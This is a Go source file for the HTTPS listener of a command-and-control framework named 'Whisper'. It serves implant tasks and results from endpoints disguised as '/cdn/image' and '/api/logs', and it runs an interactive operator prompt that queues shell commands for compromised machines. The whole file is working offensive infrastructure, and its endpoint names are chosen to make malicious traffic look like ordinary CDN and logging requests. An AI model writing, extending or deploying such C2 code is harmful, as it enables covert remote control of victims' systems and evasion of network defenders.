package https

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
	"whisper/internal/certgen"
	"whisper/server/https/handler"
)

func Start() {
	mux := http.NewServeMux()
	mux.HandleFunc("/cdn/image", handler.HandleTask)
	mux.HandleFunc("/api/logs", handler.HandleResult)

	go func() {
		fmt.Println("[*] Whisper HTTPS C2 listening on https://0.0.0.0:443")
		server := &http.Server{
			Addr:    ":443",
			Handler: mux,
			TLSConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		}
		err := server.ListenAndServeTLS(certgen.CertFile, certgen.KeyFile)
		if err != nil {
			log.Fatalf("[-] TLS Server error: %s", err)
		}

	}()
	scanner := bufio.NewScanner(os.Stdin)
	for {
		time.Sleep(1 * time.Second)
		fmt.Print("[whisper]> ")
		if !scanner.Scan() {
			fmt.Println("[-] Input error or EOF.")
			break
		}
		cmd := scanner.Text() + "\n"
		handler.CurrentCommand <- cmd
		time.Sleep(5 * time.Second)
	}
}
